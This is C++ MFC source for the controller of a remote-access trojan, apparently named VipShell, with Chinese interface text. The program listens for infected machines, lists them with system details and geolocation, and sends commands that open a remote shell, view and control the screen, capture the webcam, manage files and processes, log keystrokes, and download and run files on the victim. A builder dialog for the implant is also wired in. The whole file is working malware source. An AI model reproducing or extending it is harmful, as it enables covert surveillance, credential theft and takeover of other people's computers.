// VipClientDlg.cpp : implementation file
//

#include "stdafx.h"
#include "VipClient.h"
#include "VipClientDlg.h"
#include ".\vipclientdlg.h"
#include ".\shelldlg.h"
#include "GetScreenInputDlg.h"
#include "GetcappictureDlg.h"
#include "FileManageDlg.h"
#include "ProcessListDlg.h"
#include "KeyLogDlg.h"
#include "InputDlg.h"
#include "MakeFileDlg.h"
#include "UpdateIpDlg.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CAboutDlg dialog used for App About

const DWORD LIST_HEAD_ServerAddr = 0;
const DWORD LIST_HEAD_Explain = 1;
const DWORD LIST_HEAD_Sysver = 2;
const DWORD LIST_HEAD_Memory = 3;
const DWORD LIST_HEAD_Cpu = 4;
const DWORD LIST_HEAD_Area = 5;
const DWORD LIST_HEAD_Career = 6;

struct tagSocketInput
{
	SOCKET sScreen;
	SOCKET sInput;
};
class CAboutDlg : public CDialog
{
public:
	CAboutDlg();

// Dialog Data
	//{{AFX_DATA(CAboutDlg)
	enum { IDD = IDD_ABOUTBOX };
	//}}AFX_DATA

	// ClassWizard generated virtual function overrides
	//{{AFX_VIRTUAL(CAboutDlg)
	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV support
	//}}AFX_VIRTUAL

// Implementation
protected:
	//{{AFX_MSG(CAboutDlg)
	//}}AFX_MSG
	DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialog(CAboutDlg::IDD)
{
	//{{AFX_DATA_INIT(CAboutDlg)
	//}}AFX_DATA_INIT
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CAboutDlg)
	//}}AFX_DATA_MAP
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialog)
	//{{AFX_MSG_MAP(CAboutDlg)
		// No message handlers
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CVipClientDlg dialog

CVipClientDlg::CVipClientDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CVipClientDlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CVipClientDlg)
		// NOTE: the ClassWizard will add member initialization here
	//}}AFX_DATA_INIT
	// Note that LoadIcon does not require a subsequent DestroyIcon in Win32
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

void CVipClientDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CVipClientDlg)
	// NOTE: the ClassWizard will add DDX and DDV calls here
	//}}AFX_DATA_MAP
	DDX_Control(pDX, IDC_LIST_SERVER, m_ListServer);
}

BEGIN_MESSAGE_MAP(CVipClientDlg, CDialog)
	//{{AFX_MSG_MAP(CVipClientDlg)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	//}}AFX_MSG_MAP
	ON_WM_TIMER()
	ON_BN_CLICKED(IDC_BUTTON_GETSCREEN, OnBnClickedButtonGetscreen)
	ON_BN_CLICKED(IDC_BUTTON_GETSHELL, OnBnClickedButtonGetshell)
	ON_BN_CLICKED(IDOK, OnBnClickedOk)
	ON_BN_CLICKED(IDC_BUTTON_GETCAP, OnBnClickedButtonGetcap)
	ON_BN_CLICKED(IDC_BUTTON_FILEMANAGE, OnBnClickedButtonFilemanage)
	ON_BN_CLICKED(IDC_BUTTON_PROCESS_LIST, OnBnClickedButtonProcessList)
	ON_BN_CLICKED(IDC_BUTTON_GET_KEY_LOG, OnBnClickedButtonGetKeyLog)
	ON_NOTIFY(NM_RCLICK, IDC_LIST_SERVER, OnNMRclickListServer)
	ON_BN_CLICKED(ID_VIPSHELL_EXPLAIN, OnBnClickedVipshellExplain)
	ON_BN_CLICKED(ID_VIPSHELL_DOWNFILE, OnBnClickedVipshellDownfile)
	ON_BN_CLICKED(ID_VIPSHELL_MAKEFILE, OnBnClickedVipshellMakefile)
	ON_BN_CLICKED(IDC_BUTTON_UPDATEIP, OnBnClickedButtonUpdateip)
	ON_WM_SIZE()
	ON_NOTIFY(HDN_ITEMCLICK, 0, OnHdnItemclickListServer)
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CVipClientDlg message handlers

BOOL CVipClientDlg::OnInitDialog()
{

	CDialog::OnInitDialog();

	// Add "About..." menu item to system menu.

	// IDM_ABOUTBOX must be in the system command range.
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != NULL)
	{
		CString strAboutMenu;
		strAboutMenu.LoadString(IDS_ABOUTBOX);
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
		}
	}
	
	m_ServerImgList.Create(16, 16, TRUE | ILC_COLOR8, 4, 0); 
	m_ServerImgList.Add(theApp.LoadIcon(IDI_ICON_SERVER));
	m_ServerImgList.Add(theApp.LoadIcon(IDI_ICON_CAP));
	m_ListServer.SetImageList(&m_ServerImgList, LVSIL_SMALL);
	
	DWORD exstyle = m_ListServer.GetExtendedStyle();
	m_ListServer.SetExtendedStyle(exstyle | LVS_EX_GRIDLINES | LVS_EX_FULLROWSELECT /*| LVS_EX_CHECKBOXES*/);


	// Set the icon for this dialog.  The framework does this automatically
	//  when the application's main window is not a dialog
	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon
	
	// TODO: Add extra initialization here
	m_wndStatusBar.Create(WS_CHILD | WS_BORDER | WS_VISIBLE ,CRect(1, 1, 1, 1),this, 0x154);
	CInputDlg input(this, L"监听端口", L"52044");
	if(input.DoModal() != IDOK)
		OnOK();

	m_hServer.Create(_ttoi(input.m_strText));
	SetTimer(0x1, 100, NULL);
	SetTimer(0x2, 100, NULL);

	m_ListServer.InsertColumn(LIST_HEAD_ServerAddr, _T("IP地址"), LVCFMT_LEFT, 120, 1);
	m_ListServer.InsertColumn(LIST_HEAD_Explain, _T("注释"), LVCFMT_LEFT, 120, 1);
	m_ListServer.InsertColumn(LIST_HEAD_Sysver, _T("系统版本"), LVCFMT_LEFT, 90, 1);
	m_ListServer.InsertColumn(LIST_HEAD_Memory, _T("内存大小"), LVCFMT_LEFT, 90, 1);
	m_ListServer.InsertColumn(LIST_HEAD_Cpu, _T("CPU速度"), LVCFMT_LEFT, 90, 1);
	m_ListServer.InsertColumn(LIST_HEAD_Area, _T("所在区域"), LVCFMT_LEFT, 120, 1);
	m_ListServer.InsertColumn(LIST_HEAD_Career, _T("连接速度"), LVCFMT_LEFT, 120, 1);


	Layout();
	return TRUE;  // return TRUE  unless you set the focus to a control
}

void CVipClientDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
		CAboutDlg dlgAbout;
		dlgAbout.DoModal();
	}
	else
	{
		CDialog::OnSysCommand(nID, lParam);
	}
}

// If you add a minimize button to your dialog, you will need the code below
//  to draw the icon.  For MFC applications using the document/view model,
//  this is automatically done for you by the framework.

void CVipClientDlg::OnPaint() 
{
	if (IsIconic())
	{
		CPaintDC dc(this); // device context for painting

		SendMessage(WM_ICONERASEBKGND, (WPARAM) dc.GetSafeHdc(), 0);

		// Center icon in client rectangle
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// Draw the icon
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialog::OnPaint();
	}
}

// The system calls this to obtain the cursor to display while the user drags
//  the minimized window.
HCURSOR CVipClientDlg::OnQueryDragIcon()
{
	return (HCURSOR) m_hIcon;
}

CString CVipClientDlg::_GetServerEditionString(DWORD dwMajorVersion,DWORD dwMinorVersion, DWORD dwPlatformId)
{
	CString strRet;
	switch(dwPlatformId)
	{
	case VER_PLATFORM_WIN32_NT:
        if(dwMajorVersion<=4)
             strRet = "Windows NT ";
        if(dwMajorVersion==5 && dwMinorVersion==0)
            strRet = "Windows 2000 ";
        if(dwMajorVersion==5 && dwMinorVersion==1)
			strRet = "Windows XP ";
        if( dwMajorVersion==5 && dwMinorVersion==2)
			strRet = "Windows Server 2003 ";
		break;
	default:
		strRet = "未知版本";
	}
	return strRet;
}
CString CVipClientDlg::_GetMakeCareerString(DWORD dwTime)
{
	CString strRet;
	if(dwTime == -1)
		strRet = L"检测中..";
	else
		strRet.Format(_T("%d 毫秒"), dwTime);
	return strRet;
}
CString CVipClientDlg::_GetMemoryString(DWORD dwMenorySize)
{
	CString strRet;
	strRet.Format(_T("%d M"), dwMenorySize / 1024 / 1024);
	return strRet;
}
CString CVipClientDlg::_GetCpuString(DWORD dwCpu)
{
	CString strRet;
	strRet.Format(_T("%d ~MHz"), dwCpu);
	return strRet;
}
/***************************************/
DWORD WINAPI ThreadStartGetShell(LPVOID lp)
{
	CShellDlg dlg;
	dlg.BindSocket((SOCKET)lp);
	dlg.DoModal();
	return 0;
}

DWORD WINAPI ThreadStatrScreen(LPVOID lp)
{
	tagSocketInput* info = (tagSocketInput*)lp;
	CGetScreenInputDlg dlg;
	dlg.BindSocket(info->sScreen, info->sInput);
	delete info;
	dlg.DoModal();
	return 0;
}
DWORD WINAPI ThreadStatrGetCap(LPVOID lp)
{
	CGetCapPictureDlg dlg;
	dlg.BindSocket((SOCKET)lp);
	dlg.DoModal();
	return 0;
}
DWORD WINAPI ThreadFileManage(LPVOID lp)
{
	CFileManageDlg dlg;
	dlg.BindSocket((SOCKET)lp);
	dlg.DoModal();
	return 0;
}
DWORD WINAPI ThreadKeyLog(LPVOID lp)
{
	CKeyLogDlg dlg;
	dlg.BindSocket((SOCKET)lp);
	dlg.DoModal();
	return 0;
}

/***************************************/
CServerConnectHandle* CVipClientDlg::_GetServerByLastCmd(DWORD dwTime, DWORD* dwRet)
{
	if(dwRet)
		*dwRet = -1;
	int nFind = -1;
	CServerConnectHandle* phServer = NULL;
	for(int i = 0; i < m_ListServer.GetItemCount(); i++)
	{
		phServer  = _GetSelServer(i);
		if( phServer->m_dwCareer == -1 )
		{
			if(dwRet)
				*dwRet = i;
			return phServer;
		}
		if( GetTickCount() - phServer->m_dwLastCmd > dwTime)
		if( nFind == -1)
			nFind = i;
	}
	if( nFind != -1)
	{
		if(dwRet)
			*dwRet = nFind;
		return _GetSelServer(nFind);
	}
	return NULL;
}

void CVipClientDlg::_CheckServerConnect()
{
	DWORD dwI = -1;
	CServerConnectHandle* phServer = _GetServerByLastCmd(1000* 60, &dwI);
	if ( phServer )
	{
		bool bIsUseing = false;
		SOCKET s = phServer->GetSocket();
		for(DWORD i = 0; i < theApp.m_UserSocketVecTor.size(); i++)
		{
			if(s == theApp.m_UserSocketVecTor[i])
			{
				bIsUseing = true;
				break;
			}
		}
		tagServerSystemInfo info;
		if(!bIsUseing)
		{
			if(!phServer->GetServerInfo(&info))
			{
				m_servermap.erase(phServer->GetSocket());
				m_ListServer.DeleteItem(dwI);
			}
			else
				m_ListServer.SetItemText(dwI,  LIST_HEAD_Career, _GetMakeCareerString(phServer->m_dwCareer));
		}
	}
	std::map<DWORD, DWORD> mapIp;
	for(int i = 0; i < m_ListServer.GetItemCount(); i++)
	{
		CServerConnectHandle* phServer = _GetSelServer(i);
		mapIp[phServer->m_dwIp] = phServer->m_dwIp;
	}
	CString strText; strText.Format(L"上线机器%d台 Ip:%d个", (int)m_ListServer.GetItemCount(), (int)mapIp.size());
 	m_wndStatusBar.SetWindowText(strText);

}
void CVipClientDlg::_QueryServerConnect()
{
	CServerConnectHandle hServer;
	if( m_hServer.GetConnectHandle(&hServer) )
		OnServerLink(&hServer);
	CServerShellHandle hShell;
	if( m_hServer.GetShellHandle(&hShell) )
		OnShellLink(&hShell);
	CServerScreenInfoHandle hScreen;
	if( m_hServer.GetScreenInfoHandle(&hScreen) )
		OnScreenLink(&hScreen);
	CServerGetCapPictureHandle hCap;
	if( m_hServer.GetCapHandle(&hCap) )
		OnCapLink(&hCap);
	CServerFileManageHandle hFileManage;
	if( m_hServer.GetCServerFileManageHandle(&hFileManage) )
		OnFileManageLink(&hFileManage);
	CServerGetKeyNoHookHandle hKeyLog;
	if( m_hServer.GetServerGetKeyNoHookHandle(&hKeyLog) )
		OnKeyLogLink(&hKeyLog);
}
int CVipClientDlg::GetSelItem()
{
	POSITION posti = m_ListServer.GetFirstSelectedItemPosition();
	if(posti == NULL)
		return -1;
	DWORD dwSel = m_ListServer.GetNextSelectedItem(posti);
	return dwSel;
}
CServerConnectHandle* CVipClientDlg::_GetSelServer(DWORD dwItem)
{
	int nSel;
	if(dwItem == -1)
		nSel = GetSelItem(); 
	else
		nSel = dwItem;
	if(nSel >= m_ListServer.GetItemCount())
		return NULL;
	if ( nSel != -1)
	{
		return &m_servermap[m_ListServer.GetItemData(nSel)];
	}
	return NULL;
}
void CVipClientDlg::OnKeyLogLink(CServerGetKeyNoHookHandle* hServer)
{
	SOCKET s = hServer->Detach();
	CreateThread(NULL, 0, ThreadKeyLog, (LPVOID)s, NULL, NULL);
}
void CVipClientDlg::OnFileManageLink(CServerFileManageHandle* hServer)
{
	SOCKET s = hServer->Detach();
	CreateThread(NULL, 0, ThreadFileManage, (LPVOID)s, NULL, NULL);
}
void CVipClientDlg::OnCapLink(CServerGetCapPictureHandle* hServer)
{
	SOCKET s = hServer->Detach();
	CreateThread(NULL, 0, ThreadStatrGetCap, (LPVOID)s, NULL, NULL);
}
void CVipClientDlg::OnScreenLink(CServerScreenInfoHandle* hServer)
{
	SOCKET s = hServer->Detach();
	tagSocketInput* info = new  tagSocketInput;
	info->sInput = m_ServerInputMap[hServer->GetConnectId()];
	info->sScreen = s;
	CreateThread(NULL, 0, ThreadStatrScreen, (LPVOID)info, NULL, NULL);
}
void CVipClientDlg::OnShellLink(CServerShellHandle* hServer)
{
	SOCKET s = hServer->Detach();
	CreateThread(NULL, 0, ThreadStartGetShell, (LPVOID)s, NULL, NULL);
}
void CVipClientDlg::OnServerLink(CServerConnectHandle* hServer)
{
	SOCKET s = hServer->Detach();
	hServer->Attach(s);
	m_servermap[s] = *hServer;
	hServer->Detach();
	{

		CServerConnectHandle* hServer = &m_servermap[s];
		tagServerSystemInfo info;
		WCHAR szIp[100] =L"";
		DWORD dwPort = hServer->GetPeer(szIp);
		CString strS; strS.Format(L"%s:%d", szIp, dwPort);
		hServer->m_strAddr = szIp;
		hServer->GetPeer(hServer->m_dwIp);
		int nCount = m_ListServer.GetItemCount();
		hServer->GetServerInfoAtThis(&info);
		int nImg = 0;
		if(info.bIsCanCap)
			nImg = 1;
		int nRet = m_ListServer.InsertItem(nCount,  strS,  nImg);
		CString strVer = _GetServerEditionString(info.dwMajorVersion, info.dwMinorVersion, info.dwPlatformId);
		CString strExplain; strExplain.Format(_T("%s@%s"), info.szExplain, info.szName);
		m_ListServer.SetItemText(nRet, LIST_HEAD_Explain, strExplain);
		m_ListServer.SetItemText(nRet, LIST_HEAD_Sysver, strVer);
		m_ListServer.SetItemText(nRet,  LIST_HEAD_Memory, _GetMemoryString(info.dwMemory));
		m_ListServer.SetItemText(nRet,  LIST_HEAD_Cpu, _GetCpuString(info.dwCpuSpeed));
		m_ListServer.SetItemText(nRet,  LIST_HEAD_Area, m_QQwry.IP2Add(hServer->m_strAddr.c_str()));
		m_ListServer.SetItemText(nRet,  LIST_HEAD_Career, _GetMakeCareerString(hServer->m_dwCareer));
		
		m_ListServer.SetItemData(nRet, s);
	}
//	m_ListServer.
}
void CVipClientDlg::OnTimer(UINT nIDEvent)
{
	// TODO: 在此添加消息处理程序代码和/或调用默认值
	if(0x1 == nIDEvent)
		_QueryServerConnect();
	if(0x2 == nIDEvent)
		_CheckServerConnect();
	CDialog::OnTimer(nIDEvent);
}

void CVipClientDlg::OnCancel()
{
	// TODO: 在此添加专用代码和/或调用基类
	ShowWindow(SW_HIDE);
	m_hServer.Close();
	Sleep(2000);
	CDialog::OnCancel();
}

void CVipClientDlg::OnBnClickedButtonGetscreen()
{
	// TODO: 在此添加控件通知处理程序代码
	CServerConnectHandle* hServer =  _GetSelServer();
	if(hServer != NULL)
	{
		int  nRet = hServer->GetScreenInput();
		if(nRet == -1)
		{
			MessageBox(L"命令没有发送成功");
		}
		else
		{
			m_ServerInputMap[nRet] = hServer->GetSocket();
		}
		
	}
}

void CVipClientDlg::OnBnClickedButtonGetshell()
{
	// TODO: 在此添加控件通知处理程序代码
	CServerConnectHandle* hServer =  _GetSelServer();
	if(hServer != NULL)
	{
		bool bRet = hServer->GetShell();
		if(!bRet)
		{
			MessageBox(L"命令没有发送成功");
		}
	}
}

void CVipClientDlg::OnBnClickedOk()
{
	// TODO: 在此添加控件通知处理程序代码
	OnOK();
}

void CVipClientDlg::OnBnClickedButtonGetcap()
{
	// TODO: 在此添加控件通知处理程序代码
	CServerConnectHandle* hServer =  _GetSelServer();
	if(hServer != NULL)
	{
		bool bRet = hServer->GetCap();
		if(!bRet)
		{
			MessageBox(L"命令没有发送成功");
		}
	}
}

void CVipClientDlg::OnBnClickedButtonFilemanage()
{
	// TODO: 在此添加控件通知处理程序代码
	CServerConnectHandle* hServer =  _GetSelServer();
	if(hServer != NULL)
	{
		bool bRet = hServer->GetFileManage();
		if(!bRet)
		{
			MessageBox(L"命令没有发送成功");
		}
	}
}

void CVipClientDlg::OnBnClickedButtonProcessList()
{
	// TODO: 在此添加控件通知处理程序代码
	CServerConnectHandle* hServer =  _GetSelServer();
	if(hServer != NULL)
	{
		std::vector<tagVipShellProcess> pVecTor;
		DWORD dwRet = hServer->GetProcessList(&pVecTor);
		if(dwRet == 0 || dwRet == -1)
		{
			MessageBox(L"命令没有发送成功");
			return ;
		}
		CProcessListDlg dlg;
		dlg.BindSocket(hServer->GetSocket());
		dlg.m_pVecTor = &pVecTor;
		dlg.DoModal();
	}
}

void CVipClientDlg::OnBnClickedButtonGetKeyLog()
{
	// TODO: 在此添加控件通知处理程序代码
	CServerConnectHandle* hServer =  _GetSelServer();
	if(hServer != NULL)
	{
		bool bRet = hServer->GetServerKeyLog();
		if(!bRet)
		{
			MessageBox(L"命令没有发送成功");
		}
	}
}

void CVipClientDlg::OnNMRclickListServer(NMHDR *pNMHDR, LRESULT *pResult)
{
	// TODO: 在此添加控件通知处理程序代码
	*pResult = 0;

	//显示菜单
	CMenu menu;
	if (menu.LoadMenu(IDR_MENU_VIPSHELLDLG))
	{

		CMenu* pSubMenu = menu.GetSubMenu(0);
		if (pSubMenu) 
		{
			CPoint mouse;
			GetCursorPos(&mouse);
			//	::SetForegroundWindow(m_nid.hWnd);	
			::TrackPopupMenu(pSubMenu->m_hMenu, 0, mouse.x, mouse.y, 0,
				m_hWnd, NULL);
		}

	}
}

void CVipClientDlg::OnBnClickedVipshellExplain()
{
	// TODO: 在此添加控件通知处理程序代码
	CServerConnectHandle* hServer =  _GetSelServer();
	if(hServer != NULL)
	{
		CInputDlg input(this, L"修改注释", L"Test");
		if(input.DoModal() != IDOK)
			return ;
		bool bRet = hServer->SetServerExplain(input.m_strText);
		if(!bRet)
		{
			MessageBox(L"命令没有发送成功");
		}
		else
		{
			DWORD nSel = GetSelItem();
			m_ListServer.SetItemText(nSel, 1, input.m_strText);
		}
	}
}

void CVipClientDlg::OnBnClickedVipshellDownfile()
{
	// TODO: 在此添加控件通知处理程序代码
	CServerConnectHandle* hServer =  _GetSelServer();
	if(hServer != NULL)
	{
		CInputDlg input(this, L"下载文件", L"Test");
		if(input.DoModal() != IDOK)
			return ;
		input.m_strText.Replace(L"\\", L"/");
		bool bRet = hServer->DownFileAndRun(input.m_strText);
		if(!bRet)
		{
			MessageBox(L"命令没有发送成功");
		}
	}
}

void CVipClientDlg::OnBnClickedVipshellMakefile()
{
	// TODO: 在此添加控件通知处理程序代码
	CMakeFileDlg dlg;
	dlg.DoModal();
}

void CVipClientDlg::OnBnClickedButtonUpdateip()
{
	// TODO: 在此添加控件通知处理程序代码
	CUpdateIpDlg dlg;
	dlg.DoModal();
}
void CVipClientDlg::Layout()
{
	if(m_ListServer.GetSafeHwnd() == NULL)
		return ;
	CRect rcWnd; GetClientRect(&rcWnd);
	CRect rcList; m_ListServer.GetClientRect(&rcList);
	int nListTop = 100;
	rcList.top = nListTop;
//	rcList.
	rcList.bottom = rcWnd.Height() - nListTop - 25; 
	rcList.right = rcWnd.Width();
	m_ListServer.MoveWindow(rcList.left, rcList.top, rcList.right, rcList.bottom);
	CRect rcStatus; rcStatus = rcWnd;
	rcStatus.top = rcStatus.bottom - 25;
	m_wndStatusBar.MoveWindow(&rcStatus);

}

void CVipClientDlg::OnSize(UINT nType, int cx, int cy)
{
	CDialog::OnSize(nType, cx, cy);
	Layout();
	// TODO: 在此处添加消息处理程序代码
}
//static 
int CALLBACK CVipClientDlg::SortCompareStringFunc(LPARAM lParam1, LPARAM lParam2, LPARAM lParamSort)
{
	CVipClientDlg* pThis = (CVipClientDlg*)lParamSort;
	int c ;
	if(pThis->m_nHeadItem == 0)
		c = pThis->m_servermap[lParam1].m_dwIp - pThis->m_servermap[lParam2].m_dwIp;
	else	if (pThis->m_nHeadItem == 1)
	{
		CString strItem1 = pThis->m_servermap[lParam1].m_SystemInfo.szExplain;
		CString strItem2 = pThis->m_servermap[lParam2].m_SystemInfo.szExplain;
		c = strItem1.CompareNoCase(strItem2);
	}else if(pThis->m_nHeadItem == 2)
	{
		tagServerSystemInfo* info1 = &pThis->m_servermap[lParam1].m_SystemInfo;
		tagServerSystemInfo* info2 = &pThis->m_servermap[lParam2].m_SystemInfo;
		CString strItem1 = pThis->_GetServerEditionString(info1->dwMajorVersion, info1->dwMinorVersion, info1->dwPlatformId);
		CString strItem2 = pThis->_GetServerEditionString(info2->dwMajorVersion, info2->dwMinorVersion, info2->dwPlatformId);
		c = strItem1.CompareNoCase(strItem2);
	}else if(pThis->m_nHeadItem == 3)
		c = pThis->m_servermap[lParam1].m_SystemInfo.dwMemory - pThis->m_servermap[lParam2].m_SystemInfo.dwMemory;
	else if(pThis->m_nHeadItem == 4)
		c = pThis->m_servermap[lParam1].m_SystemInfo.dwCpuSpeed - pThis->m_servermap[lParam2].m_SystemInfo.dwCpuSpeed;
	else if(pThis->m_nHeadItem == 5)
	{
		CString strItem1 = pThis->m_servermap[lParam1].m_strAddr.c_str();
		CString strItem2 = pThis->m_servermap[lParam2].m_strAddr.c_str();
		c = strItem1.CompareNoCase(strItem2);
	}
	else if(pThis->m_nHeadItem == 6)
		c = pThis->m_servermap[lParam1].m_dwCareer - pThis->m_servermap[lParam2].m_dwCareer;
	else
		c = 0;
	if(pThis->m_bCompareType)
		c = -c;
	return c;
}
void CVipClientDlg::OnHdnItemclickListServer(NMHDR *pNMHDR, LRESULT *pResult)
{
	LPNMHEADER phdr = reinterpret_cast<LPNMHEADER>(pNMHDR);
	// TODO: 在此添加控件通知处理程序代码
	*pResult = 0;
	m_nHeadItem = phdr->iItem;
	m_ListServer.SortItems(SortCompareStringFunc,(DWORD_PTR) this);
	m_bCompareType = !m_bCompareType;
}
